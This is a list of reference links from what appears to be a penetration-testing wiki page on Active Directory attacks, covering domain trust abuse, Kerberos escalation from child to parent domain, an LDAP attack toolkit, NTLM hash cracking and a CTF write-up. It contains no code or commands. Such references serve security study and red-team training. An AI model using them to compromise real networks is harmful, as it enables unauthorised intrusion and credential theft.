- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
